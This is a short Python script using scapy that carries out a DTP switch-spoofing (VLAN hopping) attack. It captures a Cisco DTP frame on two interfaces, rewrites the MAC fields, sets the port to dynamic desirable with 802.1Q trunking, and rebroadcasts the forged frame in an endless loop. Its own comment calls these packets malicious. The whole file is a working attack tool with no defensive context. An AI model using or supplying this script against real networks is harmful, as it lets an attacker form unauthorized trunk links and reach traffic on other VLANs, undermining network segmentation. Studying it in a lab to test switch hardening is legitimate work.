import sys
import re
from scapy.all import *
from scapy.contrib.dtp import DTP, DTPNeighbor, DTPStatus, DTPType
import time
import subprocess

# Function to get the MAC address of an interface
def get_mac_address(interface):
    return open(f'/sys/class/net/{interface}/address').read().strip()

# Interface names (eth0 for Switch 1, eth1 for Switch 2)
interfaces = ["eth0", "eth1"]

# Function to craft and send DTP packet
def send_dtp_packet(interface):
    # Get the MAC address of the interface
    mac = get_mac_address(interface)
    print(f"Using MAC address {mac} for interface {interface}")
    
    # Capture one DTP packet from the neighbor switch on the specified interface
    pkt = sniff(iface=interface, count=1, filter="ether dst 01:00:0c:cc:cc:cc")[0]
    
    # Ensure the packet is a DTP packet before proceeding
    if DTP in pkt:
        # Modify the source MAC address
        pkt.src = mac

        # Modify the neighbor MAC address in DTP
        pkt[DTP][DTPNeighbor].neighbor = mac

        # Set trunk mode to dynamic desirable (0x03 in hex)
        pkt[DTP][DTPStatus].status = b'\x03'

        # Set trunk type to 802.1q
        pkt[DTP][DTPType].dtptype = b'E'

        # Send malicious DTP packets in a loop on the specified interface
        while True:
            sendp(pkt, iface=interface, verbose=1)
            time.sleep(10)
    else:
        print(f"No DTP packet captured on {interface}, exiting.")

# Send DTP packets to both switches (via eth0 and eth1)
for interface in interfaces:
    send_dtp_packet(interface)
